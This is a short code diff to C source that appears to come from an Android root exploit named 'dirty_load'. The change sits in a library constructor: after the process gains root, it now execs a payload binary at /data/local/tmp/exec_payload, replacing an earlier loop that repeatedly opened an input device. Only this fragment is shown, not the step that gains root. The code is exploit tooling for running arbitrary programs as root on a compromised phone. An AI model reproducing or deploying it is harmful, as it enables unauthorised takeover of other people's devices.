@@ -2,18 +2,16 @@
 // Created by k.leyfer on 15.03.2017.
 //
 
+#include <errno.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <fcntl.h>
-#include <sys/wait.h>
 
 #include <dlfcn.h>
 
 #ifdef DEBUG
 
 #include <android/log.h>
-#include <errno.h>
 
 #define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "dirty_load", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
 #else
@@ -110,28 +108,12 @@ __attribute__((constructor)) void say_hello()
     if (getuid() == 0)
     {
       LOGV("Got root");
-      if (daemon(0, 0) == -1)
+      if (execle("/data/local/tmp/exec_payload", "/data/local/tmp/exec_payload", (char*)NULL, environ) == -1)
       {
-        LOGV("Unable to daemonize process: %s!", strerror(errno));
-      }
-
-      while (1)
-      {
-        int fd;
-        if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
-        {
-          LOGV("Unable to open input device: %s", strerror(errno));
-          break;
-        }
-        else
-        {
-          LOGV("%d: Open input device success!", orig_pid);
-          close(fd);
-        }
-
-        sleep(1);
+        LOGV("Unable to exec payload: %s!", strerror(errno));
       }
     }
+
     exit(0);
   }
 }
